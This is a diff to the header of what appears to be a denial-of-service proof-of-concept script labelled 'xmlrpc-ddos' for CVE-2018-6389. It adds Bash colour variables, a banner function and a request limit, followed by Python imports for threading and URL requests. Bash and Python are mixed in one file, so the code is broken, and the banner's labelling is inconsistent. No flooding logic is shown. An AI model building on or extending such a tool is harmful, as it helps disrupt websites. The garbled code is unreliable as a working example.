@@ -4,7 +4,19 @@
 # Author: Nahid 
 # This is a Proof of Concept Exploit, Please use responsibly.
 #################################################################################
+grey=$(printf '\x1b[1;30m'); red=$(printf '\x1b[1;31m'); green=$(printf '\x1b[1;32m')
+yellow=$(printf '\x1b[1;33m'); default=$(printf '\x1b[1;0m')
 
+limit=100
+
+function banner() {
+    echo "+--------------------------------------------------------+"
+    echo "|    ${grey}xmlrpc-ddos${default}                        |"
+    echo "|   ${yellow}CVE-2018-6389${default}                     |"
+    echo "|   ${red}Author: Nahid${default}                        |"
+    echo "|   ${red}Link  : https://fumioryoto.github.io${default} |"
+    echo "+--------------------------------------------------------+"
+}
 import threading
 import time
 import urllib.request
